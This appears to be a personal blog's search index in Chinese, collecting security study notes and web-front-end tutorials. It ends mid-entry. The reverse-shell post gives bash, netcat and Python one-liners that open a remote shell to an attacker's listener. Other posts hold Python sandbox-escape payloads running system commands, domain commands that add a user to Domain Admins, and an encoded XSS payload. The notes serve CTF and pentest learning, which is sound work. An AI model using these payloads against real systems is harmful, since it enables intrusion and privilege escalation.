<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python_Sandbox_Bypass]]></title>
    <url>%2F2018%2F06%2F05%2FPython-Sandbox-Bypass%2F</url>
    <content type="text"><![CDATA[0x01 基础关于python沙箱逃逸的基础之前的博文写过，如果有不会的可以去看看 0x02 Python Sandbox 一般的沙箱会使用1del __builtins__.__dict__[func] 这种方式来删掉敏感的模块或者函数 0x03 常规的内联函数获取方法12[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;) //执行任意命令[].classes__.__base__.__subclasses__()[40](&apos;flag.txt&apos;).read() //读取文件 0x04 Bypass Function timeit 12import timeittimeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;,number=1) eval 1eval(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;) exec 12exec(&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;)exec &quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot; -platform12platform.os.system(&apos;whoami&apos;)platform.popen(&apos;whoami&apos;).read() 0x05 Bypass reload方法 当del了内建模块的时候可以看看reload有没有被过滤，如果没过滤1reload(__builtins__) 寻找替代函数 可以用之前的0x03 常规的内联函数获取方法找到替代方法 字符加密 可以使用base64、rot-13这种可以可以加解密的方法绕过固定的过滤当然字符串拼接也是可以的 如果是module类型，可以使用 dict .key()来获取方法名]]></content>
      <categories>
        <category>Python安全</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>沙箱逃逸</tag>
        <tag>Pyhon安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python沙箱逃逸之基础篇]]></title>
    <url>%2F2018%2F06%2F04%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%2F</url>
    <content type="text"><![CDATA[0x01 前言周末去参加了一波国赛的半决赛，发现全部都是python的题，之前还以为会有人把模版改成php的呢，结果都没有。。对于python也不是很熟悉，所以回来之后学习一下。 0x02 Python一般的利用方式一般python沙箱的话都是可以执行python命令的一个环境，因此我们需要知道一些敏感的函数来帮助我们getshell或者读取敏感文件等等 执行系统命令 12345os.system(&apos;whoami&apos;)os.popen(&apos;whoami&apos;)commands.getoutput(&apos;whoami&apos;)commands.getstatusoutput(&apos;whoami&apos;)subprocess.call(&apos;whoami&apos;,shell=True) 读取文件 123456fd = os.open(&apos;flag.txt&apos;,O_RDWR)os.read(fd,1024)--------------------------------------------file(&apos;flag.txt&apos;).read() //file函数python3会移除--------------------------------------------open(&apos;flag.txt&apos;).read() f_string python3.6之后引入的新特性，作用跟format差不多，但是可以执行命令1f&quot;&#123;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&#125;&quot; 当然这些都是常见的利用方式，还有很多利用姿势等你解锁 0x03 Python之import在做沙箱逃逸的时候import是对于getshell是很重要的，因为我们肯定是需要引入其他包的功能来进行命令执行。一般import的用法如下： import关键字 import 函数 importlib库 123import os__import__(&apos;os&apos;)importlib.import_module(&apos;os&apos;) 0x04 Python之builtin在python中，不用引用直接就能使用的叫做内建模块，对于内建模块来说，我们要区分 builtin 、 builtins 、builtins这三者 对于 builtin 和builts来说，他们的区别在于 builtin 是对于Python2.x的，而builtins是对于Python3.x的，他们都是内建模块。当我们想使用内建函数，比如chr()的时候，其实是用的 builtins .chr()的 那么 builtins 和 builtin 又有什么区别呢，其实可以把 builtins 看作是 builtin 的一个引用，但是这个引用还要看作用域 当在 main 作用域的时候，两者没有任何区别，但是想要用 builtin 的时候，必须import才能使用， builtins 就不用import 当不再 main 作用域的时候，builtins 是 builtin . dict 的引用，是个字典 一般来说，在沙箱中经常会使用12import __builtin__del __builtin__.chr 这种方式把敏感的内建函数删除 0x05 Python之 dict 与 dir() dict 和 dir() 都可一查看模块/类/对象的属性和函数，但是并不是所有的模块/对象/类都有 dict 属性的，所以可以用dir()来获取全部的属性和函数 ##0x06 Python之 mro 与 base 与 base 在Python中mro可以获取一个类的所有父类的列表(按照方法解析顺序排列)1&quot;&quot;.__class__.__mro__ base返回父类 bases返回父类的tuple ##0x07 Python之 subclasses () 之前说的mro是获取父类的列表，那么subclasses就是获取子类的列表了。因此有一个思路就是，获取任意类的父类列表，找到object类，因为所有的类都是继承object类的，所有再使用subclasses来获取子类的列表，这样就能使用所有的类了。 0x08 参考https://xz.aliyun.com/t/52#toc-10http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/]]></content>
      <categories>
        <category>Python安全</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>沙箱逃逸</tag>
        <tag>Pyhon安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mac下双网卡同时上内网和外网]]></title>
    <url>%2F2018%2F06%2F02%2Fmac%E4%B8%8B%E5%8F%8C%E7%BD%91%E5%8D%A1%E5%90%8C%E6%97%B6%E4%B8%8A%E5%86%85%E7%BD%91%E5%92%8C%E5%A4%96%E7%BD%91%2F</url>
    <content type="text"><![CDATA[有的时候我们可能为了访问内网而给电脑插上了网线，但是默认情况下就只能访问内网了，如果我们这个时候想要访问外网的话，就只能把网线拔了，再访问外网了，实在是太麻烦了，那么今天就介绍一个mac下同时访问内网和外网的方法给大家！ 首先，插上网线，并且同时连接上能够上外网的WIFI 之后打开网络偏好设置 在左侧有个下拉箭头，选择设置服务顺序 然后通过拖动，将wifi服务弄到有线服务的上面 配置好了后就准备配置路由了，开启终端输入 1sudo route -n add -net [内网ip] -netmask [内网ip的掩码] [网管ip]]]></content>
      <categories>
        <category>Mac OS</category>
      </categories>
      <tags>
        <tag>Mac OS</tag>
        <tag>小贴士</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正向代理、反向代理、透明代理]]></title>
    <url>%2F2018%2F05%2F31%2Fo%2F</url>
    <content type="text"><![CDATA[0x01 正向代理1LHost ---&gt; Proxy ---&gt; RHost 正向代理就是LHost想要访问RHost，就向Proxy发送请求，并指定要访问的对象是RHost，然后Proxy再把请求发给RHost，并将RHost返回的消息在转发给LHost，也就是说LHost对于RHost是透明的 0x02 反向代理1LHost &lt;---&gt; Proxy &lt;---&gt; Firewall &lt;---&gt; Rhost 反向代理恰恰相反，可以理解为RHost对于LHost是透明的。LHost访问的是反向代理Proxy，而一般防火墙之允许反向代理与实际的服务器RHost进行交互，也就是说，LHost永远不知道真正为他服务的服务器是哪个，他只知道访问的是反向代理，对于LHost来说，Proxy就是服务器 0x03 透明代理透明代理比较类似于正向代理，差别在于用户不知道透明代理的存在，它改编发送request报文，并传送真实的ip地址。 0x04 使用场景 正向代理 正向代理的最经典场景就是翻墙啦，比如我们想要访问谷歌，直接访问肯定不行，但是我们购买了一个代理服务器，这个代理服务器可以访问谷歌，而我们可以访问代理服务器，这样就顺利的上谷歌啦。 反向代理 隐藏自身 反向代理可以用来隐藏服务器，对于用户来说，他们访问的是反向代理，然后由反向代理通过防火墙与真正的服务器进行通讯，这样真正的服务器对于用户来说是透明的 - 负载均衡 反向代理还可以用来进行负载均衡，当大量用户进行访问的时候，访问的是反向代理，然后由隐藏在后面的某一个服务器进行真正的数据处理，每一次处理的服务器不一定是哪个，从而实现负载均衡 透明代理 透明代理最常见的就是公司里的使用了。例如某公司限制使用QQ，某员工想使用QQ进行通讯时，会发现无法使用，这里就是透明代理的作用，公司在内网和外网之间插了一个透明代理，它会根据规则抓取数据包，遇到QQ的请求就会屏蔽掉，从而限制员工使用QQ通信]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSH端口转发]]></title>
    <url>%2F2018%2F05%2F31%2FSSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[0x01 SSH隧道什么是SSH隧道呢？举个例子，我们都知道，SSH传输数据是加密传输的，可以有效的保证数据的安全，但是telnet是明文传输的，很不安全，尤其是在公网上，一旦监听到就会有很大的危害，所以一般公司的防火墙都会禁止外网通过telnet连接内网的计算机的。那么如果我们想在外面访问公司的计算机怎么办呢？这个时候就可以用到SSH隧道技术，可以保证数据的传输是加密的。通常我们讲的ssh隧道技术其实就是ssh端口转发。 0x02 SSH本地端口转发原理如下图 建立本机独享隧道 将本地9999端口通过192.168.10.1映射到192.168.10.212345ssh -L 9999:192.168.10.2:23 -Nf 192.168.10.1-L 本地端口转发-N 不执行命令或者脚本，否则会等待用户的输入-f 后台执行 建立共享隧道 他人可以通过访问我的9999端口来访问192.168.10.21ssh -g -L 9999:192.168.10.2:23 -Nf 192.168.10.1 0x03 SSH远程端口转发那么当防火墙设置为我们从外面不能直接访问内部网络的服务器，但是内部网络的服务器可以访问外面的时候，就要用到远程端口转发技术了。此时就要在内网跳板计算机上运行命令1ssh -R 9999:192.168.10.2:23 -Nf &lt;外部ip&gt; 这样外部用户只要在自己的机器上使用1telnet 127.0.0.1:9999 就可以访问到内网192.168.10.2的telnet了。 x04 SSH动态端口转发举个场景，存在远程外网服务器233.233.233.233上3000端口运行这一个web1服务，4000端口运行这一个web2服务，5000端口运行这一个web3服务（随便举的例子），然后由于防火墙策略只能用22端口连接外部网络，那么如何才能访问到那个外网服务器上的web服务呢？有的同学一定会说可以使用ssh本地端口转发呀，是的，我们可以在本地运行命令123ssh -L 6666:localhost:3000 root@233.233.233.233 //访问web1服务ssh -L 7777:localhost:4000 root@233.233.233.233 //访问web2服务ssh -L 8888:localhost:5000 root@233.233.233.233 //访问web3服务 这样做是可以的，但是吧，不觉得很麻烦嘛，如果有10个服务要访问呢，就要输入10条命令，那么这样就可以使用SSH动态端口转发功能了，只需要一条命令即可实现多端口访问。这里需要用到SOCKS代理，使用命令1ssh -D localhost:2000 root@233.233.233.233 然后在浏览器中找到设置代理的地方，选择SOCKS代理，选择SOCKS5，SOCKS主机填localhost，端口填2000，这样我们只需要在浏览器中输入localhost:3000或者localhost:4000或者localhost:5000就可以方便又快速的访问三个web服务了。这里的原理就是我们访问本地加端口的请求会被ssh转发到真正的那个地址（这里就是外网服务器），又真正的那个地址来处理这个请求，然后将数据发回来。 0x05 声明这篇文章是我通过查询资料然后根据自己的认知来写的，其中如果有什么我说错的地方希望能评论或者私信我，不胜感激！]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>内网穿透</tag>
        <tag>端口转发</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的反弹shell]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%8D%E5%BC%B9shell%2F</url>
    <content type="text"><![CDATA[0x01 bash12345受害机命令bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1本机命令nc -lvvvp 1234 首先在受害机（192.168.80.133）中开一个终端，输入1bash -i &gt;&amp; /dev/tcp/192.168.80.134/1234 0&gt;&amp;1 然后再本机（192.168.80.134）中开个终端，界面如下 输入如下命令1nc -lvvvp 1234 可以看到终端的标签已经改变了，尝试输入命令可以发现已经得到了一个shell 0x02 netcat如果目标主机有nc -e选项的话，也可以通过-e进行反弹shell还是以刚才的环境来做实验首先，在本机上输入1nc -lvvp 1234 进行监听然后再受害机输入1nc -e /bin/bash 192.168.80.134 1234 发现在本机的终端已经可以执行shell了 但是万一没有-e选项呢，那么还可以用管道进行反弹shell首先在本机开两个端口监听12nc -lvvvp 1234nc -lvvvp 4321 然后受害机输入1nc 192.168.80.134 1234 | /bin/bash | nc 192.168.80.134 4321 得到shell 0x03 Python12345678910python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.134&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; 首先在本机输入1nc -lvvvp 1234 在受害机输入1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.80.134&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&apos; 即可看到反弹了一个shell]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集-基本命令]]></title>
    <url>%2F2018%2F05%2F31%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[0x01 获取当前组的计算机名 1net view 0x02 查看所有域1net view /domain 0x03 从计算机名获取其ipv4地址1ping -n 1 SERVER08-DC -4 0x04 获取域环境的用户名单(执行命令的机器需要有域用户权限)1net user /domain 0x05 获取域组名称1net group /domain 0x06 获取域管理员1net group &quot;Domain Admin&quot; /domain 0x07 添加普通域用户123net user Test m03123. /add /domain格式为：net user 用户名 密码 /add /domain 0x08 将普通域用户变为域管理员1net group &quot;Domain Admins&quot; Test /add /domain 0x09 获取计算机名、用户名、软件版本、工作站域、登陆域1net config Workstation 0x0A 获取域控制器（在多域控制器时，并且只能在域控制器上执行）1net group &quot;Domain controllers&quot; 0x0B 查看域中所有计算机名(但是域控制器不会出现)1net group &quot;Domain computers&quot; 0x0C 跟踪路由1tracert ip]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集之定位域]]></title>
    <url>%2F2018%2F05%2F31%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E5%AE%9A%E4%BD%8D%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[0x01 查看域时间 1net time /domain 0x02 查看域服务器1nslookup -type=SRV _ldap._tcp. 其中的address就是域服务器 0x03 查看dns服务器1ipconfig /all 0x04 获取域控制器（在多域控制器时，并且只能在域控制器上执行）1net group &quot;Domain controllers&quot; /domain]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSONP实现跨域请求]]></title>
    <url>%2F2018%2F05%2F31%2FJSONP%E5%AE%9E%E7%8E%B0%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%2F</url>
    <content type="text"><![CDATA[0x01 前言今天复习了一下有关jsonp相关的攻防知识，突然发现自己对于jsonp的理解只是在书本上的那种，对于其具体的实现还是一知半解的，因此写篇文章记录一下jsonp的实现过程，会附上具体代码滴～ 0x02 JSONP的概念那么什么是JSONP呢，在理解JSONP之前，我们需要知道的是什么是JSON，有过一些web基础的小伙伴一定都听说过这个单词了，JSON是如今用来传输文本的一种很流行的格式，其格式类似这样：1234&#123; &quot;id&quot; : &quot;1&quot;, &quot;name&quot; : &quot;pino&quot;&#125; 而JSONP的话，用一张图片就比较形象的解释了 就是这样喽，多出来了一个单词和一对括号。那么JSONP用来做什么呢？通常来说，是用来跨域的，我们都知道，浏览器是存在一个叫做同源策略的东东，不同源的两个站点理论上是无法进行网络通信的，但是有的时候我们还是需要进行不同源的站点通信，那么就用到了JSONP来进行跨域通信啦。 0x03 JSONP跨域通信的实现JSONP的跨域实现有很多种方式，这里我给大家展示的是两种类型的方式，javascript和jquery，而jquery又有三种方法。 服务端尽管有很多种方式，但是这里服务端的代码是一成不变的，这里我在自己的公网服务器上创建了一个jsonp.php的文件1234567&lt;?php $arr = array(&apos;id&apos;=&gt;1, &apos;name&apos;=&gt;&apos;pino&apos;,&apos;location&apos;=&gt;&apos;china&apos;); $result = json_encode($arr); $callback = $_GET[&apos;callback&apos;]; echo $callback.&quot;($result)&quot;;?&gt; 并且修改自己电脑中的hosts文件，把公网ip对应一个域名，这里我起名为pino.my.com 3.1 前端——Javascript代码 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp&lt;/title&gt; &lt;meta content=&quot;text/html; charset=urf-8&quot; http-equiv=&quot;Content-Type&quot;&gt;&lt;script type=&quot;text/javascript&quot;&gt; function jsonpCallback(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;&lt;/script&gt;&lt;script src=&quot;http://pino.my.com/jsonp.php?callback=jsonpCallback&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;/html&gt; 需要注意的是，function一定要定义在请求之前，否则会出现未定义的错误 这里我们访问 http://localhost:8080/jsonp.html ，这个网页中有一个跨域请求，请求pino.my.com的资源，通过callback的方式完成请求 成功获取服务端资源！ 前端——JQuery之getJSON方法getJSON方法的用法如下： 实现代码如下：12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.ajax(&#123; url:&quot;http://pino.my.com/jsonp.php&quot;, dataType:&quot;jsonp&quot;, data:&quot;&quot;, jsonp:&quot;callback&quot;, success:function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, timeout:3000 &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 访问后同样成功获取资源 前端——JQuery之ajax方法代码12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery ajax&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.ajax(&#123; url:&quot;http://pino.my.com/jsonp.php&quot;, dataType:&quot;jsonp&quot;, data:&quot;&quot;, jsonp:&quot;callback&quot;, success:function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, timeout:3000 &#125;); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这里的url是直接http://pino.my.com/jsonp.php，没有?callback，这是应为ajax方法的回调是直接放在success选项中了，因此需要在success选项中定义一个回调函数function 访问一下： 前端——JQuery之get方法12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;jsonp with jquery get&lt;/title&gt; &lt;script src=&quot;https://libs.baidu.com/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;/head&gt;&lt;body&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(document).ready(function()&#123; $.get(&quot;http://pino.my.com/jsonp.php?callback=?&quot;, function(result)&#123; for(var i in result)&#123; document.write(i+&quot;:&quot;+result[i]+&quot;&lt;br /&gt;&quot;); &#125; &#125;, &apos;jsonp&apos; ); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; get方法需要写的东西跟getJSNON很像，但是一定别忘记最后还有一个jsonp的选项，否则会出错的。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>跨域</tag>
        <tag>JSONP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript中pop、push、shift、unshift方法的区别]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E4%B8%ADpop%E3%80%81push%E3%80%81shift%E3%80%81unshift%E6%96%B9%E6%B3%95%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[0x01 JS中的数组Array在Javascript中，创建一个数组的话一般如下：1var color = new Array(); 当然new关键字也可以省略，而pop、push、shift、unshift四种方法就是用来处理数组的。 0x02 栈方法在Javascript中的数组提供了一种让数组的行为类似于其他数据结构的方法，具体来说就是数组表现的像栈一样。栈是一种LIFO(后进先出)的数据结构。 push()方法可以接受任意数量的参数，把它们逐个添加到数组的末尾，并返回修改后数组的长度。 pop()方法则从数组末尾移除最后一项，减少数组的length值，然后返回移除的项。 具体例子: 0x03 队列方法栈数据结构是后进先出，而队列数据结构则是先进先出 由于push方法是向数组末端添加项的方法，因此要模拟队列只需一个从数组前端取得项的方法。shift方法能够移除数组中的第一个项并返回该项，同时将数组的长度减一。 具体例子： 0x04 模拟逆序队列操作在上一节说到了shift方法，该方法是移除队列的前端的一项，而unshift方法则与其相反，是向队列的前端添加一项，利用unshift和pop方法（从队列的末端拿出一项）可以实现逆序队列的操作]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符集]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%AD%97%E7%AC%A6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[0x01 字符与字节肉眼看到的一个文字或符号单元就是一个单元（包括乱码），一个字符可能对应1~n字节，1字节为8位，每一位要么是1，要么是0 0x02 字符集一个字符对应1~n字节是由字符集与编码决定的，比如，ASCII字符集就是一个字符对应1字节，不过1字节只用了7位，最高位用于其他目的，所以ASCII字符集共有2的7次方（128）个字符。 0x03 字符集编码一般字符集对应一种编码方式（比如GBK字符集对应了GBK编码），不过Unicode字符集的编码方式有UTF-8、UTF-7、UTF-16、URF-32。编码的目的是最终将这些字符正确的转换为计算机可理解的二进制，对应的解码就是将二进制最终解码为人类可读的字符。 0x04 宽字节编码GB2312、GBK、GB18030、BIG5等就是常说的宽字节，就是只有两字节。宽字节的问题主要是吃ASCII字符（一字节），比如，当字符集为GBK的时候，GBK编码第一字节（高字节）的范围0x81~0xFE，第二字节（低字节）的范围0x40~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5c，正好在GBK的低字节，如果之前有一个高字节，那么正好会被组成一个合法字符 GB2312是被GBK兼容的，它的高位是0xA1~0xF7，低位是0xA1~0xFE，但是在浏览器中处理行为同GBK，可能是浏览器兼容了，把GB2312统一按GBK处理。]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>编码</tag>
        <tag>字符集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[具备htmlencode功能的标签]]></title>
    <url>%2F2018%2F05%2F31%2F%E5%85%B7%E5%A4%87htmlencode%E5%8A%9F%E8%83%BD%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[以下标签具有html编码的功能]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>XSS</tag>
        <tag>HTML标签</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript自解码机制]]></title>
    <url>%2F2018%2F05%2F31%2FJavascript%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[0x01 Javascript形式的编码 Unicode形式\uH(十六进制) 普通十六进制\xH 纯转义\’、\”、\&lt;、>这样在特殊字符之前加\进行转义 0x02 Javascript自解码机制在javascript执行之前，会进行自解码，将上述形式的编码转换为原始符号 譬如：1&lt;script&gt;document.write(&apos;\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x23\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e&apos;);&lt;/script&gt; 上面编码的代码是&lt;img src=# onerror=alert(‘xss’)&gt;虽然编码了，但是还是会执行alert()]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>编码</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[onmouseover与onmousemove的区别]]></title>
    <url>%2F2018%2F05%2F31%2Fonmouseover%E4%B8%8Eonmousemove%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[onmouseover事件是指当鼠标指针进入指定区域是触发而onmousemove事件是指当鼠标指针在指定区域移动时触发onmouseover主要是刚进入指定区域的那一瞬间onmousemove是除了刚进入的那一瞬间外，进入后在指定区域移动也算]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>XSS</tag>
        <tag>HTML标签</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端对象之Browser对象]]></title>
    <url>%2F2018%2F05%2F31%2FWeb%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%B1%A1%E4%B9%8BBrowser%E5%AF%B9%E8%B1%A1%2F</url>
    <content type="text"><![CDATA[0x01 前言之前对于Web前端不是很擅长，大概是总接触服务端的东西吧，之前有个面试问到了前端方面的知识，才发现自己的前端是有多烂，所以这里记一记笔记吧~ 0x02 Window对象 概念window对象是浏览器打开一个窗口。当HTML文档中包含iframe或frame的时候，浏览器会为HTML文档创建一个window对象，并为每一个iframe再额外创建一个window对象 常用对象属性 document 对Document对象的只读引用 frames 返回窗口中所有命名的frame框架，该属性是一个数组。 history 对History对象的只读引用 location 对Location对象的只读引用 navigator 对Navigator对象的只读引用 opener 返回对创建此窗口的窗口引用 parent 返回父窗口 self 返回当前窗口 top 返回最上层的父窗口 常用对象方法 alert() 弹警告窗 confirm() 弹确认窗 open() / close() 打开/关闭 窗口 print() 打印当前窗口的内容 focus() 给予当前窗口焦点 blur() 把键盘焦点从顶层窗口移开 setTimeout() 在指定的毫秒数后调用函数或计算表达式 setInterval() 按照指定的周期（以毫秒计）来调用函数或计算表达式 execScript() 与eval类似 0x03 Location对象 概念 Location对象包含当前URL的信息，可以用window.location访问 常用对象属性 hostname 返回主机名 pathname 返回路径名 host 返回主机名和端口号 port 返回端口号 protocol 返回协议 hash 返回锚部分（#后面的内容） href 返回完整的url search 返回查询部分（？后面的内容） 常用对象方法 assign() 加载新文档（就是访问一个网页） reload() 重新载入当前文档（刷新） replace() 用新文档替换当前文档 0x04 History对象 概述 History对象包含用户（在浏览器中）访问过的URL 常用对象属性 length返回History列表中URL数量 常用对象方法 back() 加载前一个History列表前一个URL forward() 加载后一个History列表后一个URL go() 直接加载一个History列表中具体的URL 0x05 Navigator对象 概述 Navigator对象包含浏览器的信息 常用对象属性 appCodeName 返回浏览器代码名称 appName 返回浏览器名称 appVersion 返回浏览器平台和版本信息 cookieEnable 返回浏览器是否启用cookie platform 返回运行浏览器的操作系统的版本 userAgent 返回浏览器的UA头]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web前端对象之Document]]></title>
    <url>%2F2018%2F05%2F31%2FWeb%E5%89%8D%E7%AB%AF%E5%AF%B9%E8%B1%A1%E4%B9%8BDocument%2F</url>
    <content type="text"><![CDATA[0x01 Document对象当浏览器载入一个HTML文档时，它就变成了document对象。document对象是window对象的属性，可以用window.document来访问 0x02 常用对象属性 document.baseURI 返回网页的绝对URL（IE不支持） document.URL 返回网页的URL document.cookie 返回cookie document.body 返回文档body元素 docuemnt.referrer 返回载入当前文档的文档的 URL document.location 返回当前文档的URL 0x03 常用对象方法 document.write() 向文档中写东西 document.writeln() 跟document.write()一个功能，只不过每次写的时候都会加一个\n document.attachEvent() 事件绑定，仅支持IE浏览器 document.addEventListener() 事件绑定，支持所有浏览器 document.execCommand() 处理HTML数据 document.open() 打开一个输出流，用来收集document.write()和document.writeln()的输出的内容]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>Javascript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无法执行脚本的标签]]></title>
    <url>%2F2018%2F05%2F31%2F%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E7%9A%84%E6%A0%87%E7%AD%BE%2F</url>
    <content type="text"><![CDATA[0x01 无法直接执行脚本 12345678910111213141516- &lt;title&gt;&lt;/title&gt;- &lt;textarea&gt;&lt;/textarea&gt;- &lt;xmp&gt;&lt;/xmp&gt;- &lt;iframe&gt;&lt;/iframe&gt;- &lt;noscript&gt;&lt;/noscript&gt; noscript 元素用来定义在脚本未被执行时的替代内容（文本）。- &lt;noframes&gt;&lt;/noframes&gt; noframes 元素可为那些不支持框架的浏览器显示文本。noframes 元素位于 frameset 元素内部。- &lt;plaintext&gt;&lt;/plaintext&gt; 标签的所有内容，将按照HTML源代码的方式显示 ##0 x02 无法嵌套其他标签 123- &lt;script&gt;&lt;/script&gt;- &lt;style&gt;&lt;/style&gt;]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTML自解码机制]]></title>
    <url>%2F2018%2F05%2F31%2FHTML%E8%87%AA%E8%A7%A3%E7%A0%81%E6%9C%BA%E5%88%B6%2F</url>
